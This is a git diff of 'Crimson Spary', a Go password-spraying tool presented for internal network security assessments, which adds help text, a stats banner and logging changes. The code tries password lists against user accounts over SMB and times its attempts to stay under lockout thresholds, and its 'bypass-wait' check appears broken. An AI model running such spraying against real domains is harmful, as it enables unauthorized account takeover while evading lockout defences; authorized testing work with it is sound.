@@ -15,21 +15,58 @@ import (
 
 func main() {
 	parser := argparse.NewParser("Crimson Spary","A lockout aware password sprayer for Internal network security assessments.")
-	var userFilePathArg = parser.String("u","username-file",&argparse.Options{Required: true,Help: "File of users separated by newlines"})
-	var passFilePathArg = parser.String("p","password-file",&argparse.Options{Required: true,Help: "File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
-	var domainArg = parser.String("d","domain",&argparse.Options{Required: true})
-	var targetArg = parser.String("t","target",&argparse.Options{Required: true,Help: "IP or Hostname of target to authenticate against."})
-	var lockThresh = parser.Int("a","Lockout-Threshold",&argparse.Options{Required: true,Help: "Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
-	var lockThreshTime  = parser.Int("l","Lockout-Reset",&argparse.Options{Required: true,Help: "Duration of time in minutes for the threshold timer to elapse. An addition minute is added."})
-	var lockTime = parser.Int("r","Lockout-Timer",&argparse.Options{Required: true,Help: "Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute."})
+	var userFilePathArg = parser.String("u","username-file",&argparse.Options{Required: true,Help: "(Required) File of users separated by newlines"})
+	var passFilePathArg = parser.String("p","password-file",&argparse.Options{Required: true,Help: "(Required) File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
+	var domainArg = parser.String("d","domain",&argparse.Options{Required: true,Help: "(Required) Domain of user "})
+	var targetArg = parser.String("t","target",&argparse.Options{Required: true,Help: "(Required) IP or Hostname of target to authenticate against"})
+	var lockThresh = parser.Int("a","Lockout-Threshold",&argparse.Options{Required: true,Help: "(Required) Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
+	var lockThreshTime  = parser.Int("l","Lockout-Reset",&argparse.Options{Required: true,Help: "(Required) Duration of time in minutes for the threshold timer to elapse. An addition minute is added"})
+	var lockTime = parser.Int("r","Lockout-Timer",&argparse.Options{Required: true,Help: "(Required) Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute."})
+	var bypassWait = parser.Flag("","bypass-wait",&argparse.Options{Help: "Bypass initial lock threshold reset period"})
+	var noHeaderArg = parser.Flag("","no-stats",&argparse.Options{Default: false,Help: "Suppress stats banner"})
 	var verboseArg = parser.Flag("v","verbose",&argparse.Options{Default: false,Help: "Print Debug"})
+
 	err := parser.Parse(os.Args)
 	if err != nil {
-		fmt.Print(parser.Usage(err))
+		log.Println(parser.Usage(err))
 	} else {
+		if *noHeaderArg == false{
+			preRunChecks(*userFilePathArg,*passFilePathArg,*domainArg,*targetArg,*lockThresh,*lockThreshTime,*lockTime)
+		}
+		if bypassWait != nil{
+			log.Printf("Waiting inital lockout reset threshold... %d mins (You can bypass this with -bypass-wait)",*lockThreshTime)
+			time.Sleep(time.Duration(*lockThreshTime) * time.Minute)
+		}
+		log.Printf("Starting Spray..... ")
 		multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime ,*lockTime,*verboseArg)
 	}
 
+
+}
+
+func preRunChecks(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int){
+	userListLen := len(readFile(usernamePath))
+	passwordListLen := len(readFile(passwordPath))
+	numberOfRounds := passwordListLen / (lockoutThreshold-1)
+	estimatedMaxTime := numberOfRounds*(lockoutResetTimer+1)
+	timeLongForm := time.Duration(estimatedMaxTime) * time.Minute
+	fmt.Println()
+	fmt.Printf("Imported Users: %d\n",userListLen)
+	fmt.Printf("Imported Passwords: %d\n",passwordListLen)
+	fmt.Println()
+	fmt.Printf("Target Domain: %s\n",domain)
+	fmt.Printf("Target Host: %s\n",targetIP)
+	fmt.Println()
+	fmt.Printf("Lockout Attempt Threshold: %d \n",lockoutThreshold)
+	fmt.Printf("Lockout Threshold Reset: %s \n",time.Duration(lockoutResetTimer) * time.Minute)
+	fmt.Printf("Lockout Timer: %s \n",time.Duration(lockoutTimer) * time.Minute)
+	fmt.Printf("Estimated Max Completion Time (if no lockout occurs): %s\n",timeLongForm)
+	fmt.Println()
+	/*
+	UserList will not matter if all accounts are tested at once.
+	Passwordlistlen / lockoutThreshold = roundsOfAttempts
+	LockoutResetTimer * roundOfAttempt = Estimated max time if no lockouts occure
+	 */
 
 }
 
@@ -49,7 +86,7 @@ func singleUserSpray(usernamePath string, passwordPath string, domain string, ta
 				if result == 0 {
 					break
 				} else if result == 2 {
-					fmt.Printf("User account %s is locked out.\n", users)
+					log.Printf("User account %s is locked out.\n", users)
 					break
 				}
 				currentPasswordIndex++
@@ -57,7 +94,7 @@ func singleUserSpray(usernamePath string, passwordPath string, domain string, ta
 			if result == 0 {
 				break
 			}
-			fmt.Printf("Sleeping for %d mins\n", resetTimerDuration)
+			log.Printf("Sleeping for %d mins\n", resetTimerDuration)
 			time.Sleep(time.Duration(resetTimerDuration) * time.Minute)
 
 		}
@@ -84,7 +121,7 @@ func multiSpray(usernamePath string, passwordPath string, domain string, targetI
 func UserSpray(username string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose bool) string {
 
 	passwordList := readFile(passwordPath)
-	resetTimerDuration := int(lockoutResetTimer + 1)
+	resetTimerDuration := lockoutResetTimer + 1
 	attemptThreshold := lockoutThreshold - 2
 	currentPasswordIndex := 0
 	for currentPasswordIndex < len(passwordList)+1 {
@@ -95,7 +132,7 @@ func UserSpray(username string, passwordPath string, domain string, targetIP str
 			if result == 0 {
 				break
 			} else if result == 2 {
-				timePrint(fmt.Sprintf("User account %s is locked out. Lockout out ends in %d mintues\n", username, lockoutTimer+1))
+				log.Printf("User account %s is locked out. Lockout out ends in %d mintues\n", username, lockoutTimer+1)
 				time.Sleep(time.Duration(lockoutTimer+1) * time.Minute)
 			}
 			currentPasswordIndex++
@@ -103,7 +140,7 @@ func UserSpray(username string, passwordPath string, domain string, targetIP str
 		if result == 0 {
 			break
 		}
-		timePrint(fmt.Sprintf("Threshold for %s resets in %d mins\n", username,resetTimerDuration))
+		log.Printf("Threshold for %s resets in %d mins\n", username,resetTimerDuration)
 		time.Sleep(time.Duration(resetTimerDuration) * time.Minute)
 
 	}
@@ -146,18 +183,18 @@ func testCred(name string, passwordGuess string, domainDst string, ip string,ver
 		if strings.Contains(err.Error(), "automatically locked because too many invalid logon attempts") {
 			return 2
 		} else {
-			timePrint(fmt.Sprintf("Failed %s:%s\n",name,passwordGuess))
+			log.Printf("Failed %s:%s\n",name,passwordGuess)
 			return 1
 		}
 	} else {
-		timePrint(fmt.Sprintf("Found %s:%s\n",name,passwordGuess))
+		log.Printf("Found %s:%s\n",name,passwordGuess)
 		return 0
 	}
 
 }
 
 func sannityCheckIP(ip string) bool {
-	fmt.Printf("Testing connection to %s\n", ip)
+	log.Printf("Testing connection to %s\n", ip)
 	dstServer := fmt.Sprintf("%s:445", ip)
 	_, err := net.Dial("tcp", dstServer)
 	if err != nil {
@@ -181,10 +218,6 @@ func readFile(filepath string) []string {
 	return entries
 }
 
-func timePrint(text string){
-	currentTime := time.Now()
-	fmt.Printf("%s: %s",currentTime.Format("2006/01/02 03:04:05 pm"),text)
-}
 
 /* Modes:
 1: Rush - Attempts burst in short amount of time for all users upto lockout threshold - more likely to be detected
